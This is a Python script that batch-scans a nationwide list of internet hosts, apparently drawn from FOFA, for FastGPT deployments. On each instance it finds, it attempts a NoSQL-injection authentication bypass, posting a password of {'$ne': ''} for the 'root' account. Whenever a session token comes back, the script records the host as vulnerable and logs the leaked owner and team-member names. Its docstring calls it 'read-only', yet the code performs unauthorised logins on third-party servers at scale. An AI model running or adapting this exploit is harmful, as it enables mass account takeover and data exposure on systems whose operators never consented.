# -*- coding: utf-8 -*-
"""全国独立 FastGPT 40341/40351 批量探针（对照组先行，只读非武器化）
指纹: GET /api/common/system/getInitData 含 feConfigs
验证: 对照组 root_ne_probe（不存在用户）→ 实验组 root {"$ne":""}，code 200 + token + Owner 即定案
增量落盘断点续跑。用法: python fg_national_probe.py <起始> <结束>
"""
import warnings, requests, json, time, sys
warnings.filterwarnings('ignore')

pool = json.load(open('fofa_pool/fg_national_slices.json', encoding='utf-8'))
CN_TAGS = ('cn', 'cn443', 'cn80', 'cn3000', 'cn9001', 'cn8080',
           'bj', 'sh', 'gd', 'zj', 'js', 'sc', 'hub', 'sd', 'cn83cn')
def prio(h):
    tags = pool.get(h, [])
    return (0 if any(t in CN_TAGS for t in tags) else 1, h)
hosts = sorted(pool.keys(), key=prio)
start, end = int(sys.argv[1]), int(sys.argv[2])

try:
    results = json.load(open('fofa_pool/fg_national_probe.json', encoding='utf-8'))
except Exception:
    results = {}

s = requests.Session()
s.trust_env = True
for t in hosts[start:end]:
    key = t.rstrip('/')
    if results.get(key, {}).get('done'):
        continue
    r = {'target': key}
    try:
        g = s.get(key, timeout=8, verify=False)
        r['home'] = g.status_code
        if g.status_code != 200:
            r['skip'] = 'home not 200'
        else:
            init = s.get(key + '/api/common/system/getInitData', timeout=8, verify=False)
            if init.status_code == 200 and '"feConfigs"' in init.text:
                r['fastgpt'] = True
                login = key + '/api/support/user/account/loginByPassword'
                try:
                    c = s.post(login, json={"username": "root_ne_probe", "password": {"$ne": ""}},
                               timeout=8, verify=False)
                    r['ctrl_code'] = (c.json() or {}).get('code')
                except Exception:
                    r['ctrl_code'] = 'err'
                time.sleep(1.0)
                rr = s.post(login, json={"username": "root", "password": {"$ne": ""}},
                            timeout=8, verify=False)
                try:
                    d = rr.json()
                    if d.get('code') == 200 and (d.get('data') or {}).get('token'):
                        u = d['data']['user']
                        r['VULNERABLE'] = True
                        r['login_user'] = u.get('username')
                        r['team_member'] = (u.get('team') or {}).get('memberName')
                    else:
                        r['VULNERABLE'] = False
                        r['resp_code'] = d.get('code')
                        r['statusText'] = d.get('statusText')
                except Exception:
                    r['VULNERABLE'] = False; r['note'] = 'login non-json'
            else:
                r['fastgpt'] = False
    except Exception as e:
        r['error'] = str(e)[:100]
    r['done'] = True
    results[key] = r
    json.dump(results, open('fofa_pool/fg_national_probe.json', 'w'), ensure_ascii=False, indent=1)
    tag = 'HIT' if r.get('VULNERABLE') else ('fg' if r.get('fastgpt') else str(r.get('home', 'E')))
    print(f"[{tag}] {key} {r.get('login_user','')} {r.get('team_member','')}", flush=True)
    time.sleep(1.5)

vul = [k for k, v in results.items() if v.get('VULNERABLE')]
fg = [k for k, v in results.items() if v.get('fastgpt')]
print(f'FastGPT 确认 {len(fg)}；40351 命中 {len(vul)}；已探 {len(results)}/{len(hosts)}')
